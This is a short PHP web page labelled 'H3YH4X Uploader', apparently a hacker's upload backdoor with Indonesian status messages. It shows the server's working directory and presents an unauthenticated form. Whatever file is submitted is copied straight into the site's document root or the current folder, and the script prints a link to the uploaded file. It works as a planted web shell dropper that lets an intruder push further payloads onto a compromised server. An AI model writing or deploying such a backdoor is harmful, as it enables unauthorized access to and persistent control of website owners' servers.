<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
</head>
<body>
<script>
    </script>
</style>

<body>

<center>
<font color='Black' size="5px"> H3YH4X Uploader</font><br>
<?php
echo '<big><span style="color: black;">Directory: <span style="color: gray;">'.getcwd().'</span></big><br><br>';
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file'>
	  <input type='submit' name='upload' value='Upload!'>
	  </form>
	  </center>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "<font color='lime'sukses upload -> <center><a href='$web$files' target='_blank'><b><u>$web/$files</u></b></a></center>";
		} else {
			echo "<font color='red'gagal upload di document root.";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " upload <b>$files</b> di folder ini";
		} else {
			echo "gagal upload";
		}
	}
}
?>
</body>
<br>
<br>
<br>
</body>
</html>
